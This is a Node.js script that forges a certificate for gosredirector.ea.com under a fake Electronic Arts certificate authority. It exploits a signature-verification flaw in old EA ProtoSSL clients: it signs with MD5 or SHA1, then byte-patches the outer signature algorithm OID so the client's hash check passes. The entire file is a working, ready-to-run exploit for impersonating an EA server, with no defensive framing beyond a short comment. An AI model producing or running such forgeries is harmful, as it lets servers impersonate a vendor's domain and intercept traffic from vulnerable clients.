// Forge a gosredirector.ea.com certificate that old EA ProtoSSL clients accept (Aim4kill/Bug_OldProtoSSL technique):
// sign the leaf with MD5 (or SHA1), then rewrite the OUTER signatureAlgorithm OID to rsaEncryption (…01 01 01).
// The client then hits the "unknown signature algorithm" branch, sets the hash size to 0 and memcmp() passes.
// Output: ./certs/gosredirector_mod.crt (PEM) + ./certs/gosredirector.key.pem. Nothing here ever contacts EA.
import { execFileSync } from 'node:child_process';
import { mkdirSync, readFileSync, writeFileSync, existsSync } from 'node:fs';
import { join } from 'node:path';

const dir = join(import.meta.dirname, 'certs');
mkdirSync(dir, { recursive: true });
const f = (n) => join(dir, n);
const ssl = (...args) => execFileSync('openssl', args, { stdio: ['ignore', 'pipe', 'pipe'] }).toString();

const CA_SUBJ = '/OU=Online Technology Group/O=Electronic Arts, Inc./L=Redwood City/ST=California/C=US/CN=OTG3 Certificate Authority';
const LEAF_SUBJ = '/CN=gosredirector.ea.com/OU=Global Online Studio/O=Electronic Arts, Inc./ST=California/C=US';

if (!existsSync(f('ca.key.pem'))) ssl('genrsa', '-out', f('ca.key.pem'), '1024');
if (!existsSync(f('leaf.key.pem'))) ssl('genrsa', '-out', f('leaf.key.pem'), '1024');

let digest = 'md5';
let oidLast = '04';
try {
  ssl('req', '-new', '-x509', `-${digest}`, '-days', '28124', '-key', f('ca.key.pem'), '-out', f('ca.crt'), '-subj', CA_SUBJ);
} catch (e) {
  console.warn('md5 signing unavailable in this OpenSSL, falling back to sha1');
  digest = 'sha1'; oidLast = '05';
  ssl('req', '-new', '-x509', `-${digest}`, '-days', '28124', '-key', f('ca.key.pem'), '-out', f('ca.crt'), '-subj', CA_SUBJ);
}
ssl('req', '-new', '-key', f('leaf.key.pem'), '-out', f('leaf.csr'), '-subj', LEAF_SUBJ);
ssl('x509', '-req', '-in', f('leaf.csr'), '-CA', f('ca.crt'), '-CAkey', f('ca.key.pem'), '-CAcreateserial', '-out', f('leaf.crt'), '-days', '10000', `-${digest}`);
ssl('x509', '-outform', 'der', '-in', f('leaf.crt'), '-out', f('leaf.der'));

const der = Buffer.from(readFileSync(f('leaf.der')));
const pattern = Buffer.from('2a864886f70d0101' + oidLast, 'hex');
const hits = [];
for (let i = der.indexOf(pattern); i !== -1; i = der.indexOf(pattern, i + 1)) hits.push(i);
if (hits.length < 2) throw new Error(`expected 2 occurrences of the ${digest} OID, found ${hits.length}`);
const last = hits[hits.length - 1];
der[last + pattern.length - 1] = 0x01; // -> rsaEncryption
writeFileSync(f('gosredirector_mod.der'), der);
ssl('x509', '-inform', 'der', '-in', f('gosredirector_mod.der'), '-out', f('gosredirector_mod.crt'));
writeFileSync(f('gosredirector.key.pem'), readFileSync(f('leaf.key.pem')));
console.log(`signed with ${digest}; patched OID occurrence at byte ${last} (${hits.length} occurrences)`);
console.log(ssl('x509', '-in', f('gosredirector_mod.crt'), '-noout', '-subject', '-issuer', '-dates'));
try { console.log(ssl('x509', '-in', f('gosredirector_mod.crt'), '-noout', '-text').split('\n').filter((l) => /Signature Algorithm/.test(l)).join('\n')); } catch {}
